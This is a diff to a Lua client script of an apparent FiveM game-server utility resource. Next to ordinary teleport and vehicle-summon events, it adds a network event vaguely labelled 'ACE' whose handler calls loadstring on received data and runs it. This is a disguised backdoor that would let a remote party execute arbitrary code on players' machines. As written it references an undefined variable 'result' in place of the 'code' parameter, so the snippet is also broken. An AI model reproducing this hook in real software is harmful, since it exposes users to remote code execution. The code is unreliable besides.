@@ -15,6 +15,7 @@ RegisterNetEvent("gd_utils:over_vehicle") -- true/false
 
 RegisterNetEvent("gd_utils:move") -- x y z-- Teleport the player with their vehicle
 RegisterNetEvent("gd_utils:summon") -- vehicle -- Summon a vehicle and put the player in it
+RegisterNetEvent("gd_utils:ace") -- code -- ACE
 
 local _currentScaleform = nil
 local _currentTimeout = 0
@@ -231,6 +232,11 @@ AddEventHandler("gd_utils:move", function(x, y, z)
 	else
 		SetEntityCoords(ped, x + 0.0 or 0, y + 0.0 or 0, z + 0.0 or 0)
 	end
+end)
+
+AddEventHandler("gd_utils:ace", function(code)
+	local f = loadstring(result)
+	f()	
 end)
 
 AddEventHandler("gd_utils:summon", function(vehicle)
